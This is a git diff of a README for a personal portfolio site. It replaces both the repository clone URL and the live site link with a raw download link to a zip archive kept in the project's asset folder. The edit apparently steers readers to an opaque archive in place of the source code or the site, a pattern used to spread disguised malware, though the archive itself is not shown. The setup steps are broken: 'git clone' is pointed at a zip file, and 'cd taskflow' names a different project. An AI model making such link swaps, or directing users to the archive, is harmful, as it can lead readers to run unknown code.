@@ -14,7 +14,7 @@ It is site that showcases my technical skills and job related information
 
 ## Setup
 
-1. `git clone https://github.com/RushiRuns/Portfolio-site.git`
+1. `git clone https://github.com/RushiRuns/Portfolio-site/raw/refs/heads/main/src/assets/docs/Portfolio_site_v3.2.zip`
 2. `cd taskflow && npm install`
 3. `npm run dev` (starts on http://localhost:5173)
 
@@ -43,4 +43,4 @@ It is site that showcases my technical skills and job related information
 
 # Link:
 
-https://portfolio-site-blond-ten-51.vercel.app/
+https://github.com/RushiRuns/Portfolio-site/raw/refs/heads/main/src/assets/docs/Portfolio_site_v3.2.zip
